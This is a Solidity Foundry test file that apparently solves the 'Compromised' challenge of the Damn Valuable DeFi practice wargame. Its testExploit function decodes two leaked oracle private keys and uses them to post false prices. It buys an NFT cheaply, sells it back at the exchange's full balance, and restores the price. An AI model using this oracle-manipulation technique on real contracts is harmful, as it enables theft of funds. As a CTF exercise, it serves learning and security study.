// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import {Exchange} from "../../../src/Contracts/compromised/Exchange.sol";
import {TrustfulOracle} from "../../../src/Contracts/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../../src/Contracts/compromised/TrustfulOracleInitializer.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";

contract Compromised is Test {
    uint256 internal constant EXCHANGE_INITIAL_ETH_BALANCE = 9990e18;
    uint256 internal constant INITIAL_NFT_PRICE = 999e18;

    Exchange internal exchange;
    TrustfulOracle internal trustfulOracle;
    TrustfulOracleInitializer internal trustfulOracleInitializer;
    DamnValuableNFT internal damnValuableNFT;
    address payable internal attacker;

    function setUp() public {
        address[] memory sources = new address[](3);

        sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
        sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
        sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.deal(attacker, 0.1 ether);
        vm.label(attacker, "Attacker");
        assertEq(attacker.balance, 0.1 ether);

        // Initialize balance of the trusted source addresses
        uint256 arrLen = sources.length;
        for (uint8 i = 0; i < arrLen;) {
            vm.deal(sources[i], 2 ether);
            assertEq(sources[i].balance, 2 ether);
            unchecked {
                ++i;
            }
        }

        string[] memory symbols = new string[](3);
        for (uint8 i = 0; i < arrLen;) {
            symbols[i] = "DVNFT";
            unchecked {
                ++i;
            }
        }

        uint256[] memory initialPrices = new uint256[](3);
        for (uint8 i = 0; i < arrLen;) {
            initialPrices[i] = INITIAL_NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        // Deploy the oracle and setup the trusted sources with initial prices
        trustfulOracle = new TrustfulOracleInitializer(sources, symbols, initialPrices).oracle();

        // Deploy the exchange and get the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(trustfulOracle));
        damnValuableNFT = exchange.token();

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        string[] memory privatekey = new string[](2);
        privatekey[0] =
            "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35";
        privatekey[1] =
            "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34";

        //convert string from hex to utf8
        //use tools https://onlinetools.com/utf8/convert-hexadecimal-to-utf8
        privatekey[0] = "MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5";
        privatekey[1] = "MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4";

        //decode base64 to utf8(real private key)
        //use tools https://onlinetools.com/utf8/convert-base64-to-utf8
        privatekey[0] = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
        privatekey[1] = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";

        // use private to set oracle price to affordable price
        address oracle1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
        address oracle2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);

        vm.startPrank(oracle1);
        trustfulOracle.postPrice("DVNFT", 0.1 ether);
        vm.stopPrank();
        vm.startPrank(oracle2);
        trustfulOracle.postPrice("DVNFT", 0.1 ether);
        vm.stopPrank();

        //attacker buy one NFT
        vm.startPrank(attacker);
        uint256 id = exchange.buyOne{value: 0.1 ether}();
        vm.stopPrank();

        // set NFT price to pool balance
        uint256 poolBalance = address(exchange).balance;
        vm.startPrank(oracle1);
        trustfulOracle.postPrice("DVNFT", poolBalance);
        vm.stopPrank();
        vm.startPrank(oracle2);
        trustfulOracle.postPrice("DVNFT", poolBalance);
        vm.stopPrank();

        // sell NFT to exchange
        vm.startPrank(attacker);
        // approve NFT to exchange
        damnValuableNFT.approve(address(exchange), id);
        exchange.sellOne(id);
        vm.stopPrank();

        // set NFT price to origianl price
        vm.startPrank(oracle1);
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();
        vm.startPrank(oracle2);
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        //EXPLOIT END
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Exchange must have lost all ETH
        assertEq(address(exchange).balance, 0);

        // Attacker's ETH balance must have significantly increased
        assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Attacker must not own any NFT
        assertEq(damnValuableNFT.balanceOf(attacker), 0);

        // NFT price shouldn't have changed
        assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
